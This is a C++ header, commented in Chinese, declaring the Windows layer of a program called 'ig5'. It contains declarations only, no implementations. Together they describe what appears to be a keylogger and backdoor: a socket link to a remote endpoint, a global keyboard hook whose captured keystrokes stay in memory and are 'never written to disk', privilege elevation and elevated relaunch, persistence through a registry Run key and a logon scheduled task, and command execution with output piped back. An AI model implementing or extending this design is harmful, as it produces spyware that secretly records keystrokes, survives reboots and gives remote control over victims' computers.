// ig5_win.hpp —— Windows 专有层接口（Win11 x64 / MSVC 或 MinGW-w64）
#pragma once
#ifndef _WIN32
#error "ig5_win.hpp 只在 Windows 目标下编译"
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <atomic>
#include <cstdint>
#include <optional>
#include <span>
#include <string>
#include <vector>
#include "frame.hpp"

namespace ig5 {

// ---- 网络 ----
struct Endpoint { std::string host; std::uint16_t port; };

bool win_net_startup(std::string& err);
void win_net_shutdown();

class SocketLink {
public:
    SocketLink() = default;
    ~SocketLink();
    SocketLink(const SocketLink&) = delete;
    SocketLink& operator=(const SocketLink&) = delete;

    bool connect_to(const Endpoint& ep, int timeout_ms, std::string& err);
    bool send_all(std::span<const std::uint8_t> data, std::string& err);
    int  recv_some(std::span<std::uint8_t> out, int timeout_ms, std::string& err);  // >0 字节; 0 优雅关闭; -1 错误; -2 超时
    void close_link();
    bool valid() const noexcept { return sock_ != INVALID_SOCKET; }

private:
    SOCKET sock_{INVALID_SOCKET};
};

// ---- 运行时采集（仅内存环形缓冲，绝不落盘）----
struct KeyEvent { std::uint32_t vk; bool down; std::uint64_t tick_ms; };

bool hook_install(std::string& err);
void hook_uninstall();
void hook_run_message_loop(const std::atomic<bool>& stop, int idle_ms);
std::vector<KeyEvent> hook_drain(std::size_t max_items);
std::size_t hook_pending();

// ---- 身份 / 权限 ----
bool token_is_elevated(bool& elevated, std::string& err);
bool token_integrity(std::string& level, std::string& err);
bool token_in_admin_group(bool& in_admin, std::string& err);
bool token_enable(std::wstring& privilege_name, bool& enabled, std::string& err);
bool relaunch_elevated(const std::wstring& exe, std::string& err);

// ---- 持久化（两条互备路径，均可清除）----
bool persist_registry_run(const std::wstring& exe, const std::wstring& value_name, std::string& err);
bool persist_schtask_onlogon(const std::wstring& exe, const std::wstring& task_name, std::string& err);
bool persist_remove_run(const std::wstring& value_name, std::string& err);
bool persist_remove_task(const std::wstring& task_name, std::string& err);

// ---- 进程执行（管道回读，不落盘）----
bool run_capture(const std::wstring& cmdline, std::string& out_utf8, std::string& err, DWORD timeout_ms);

}  // namespace ig5
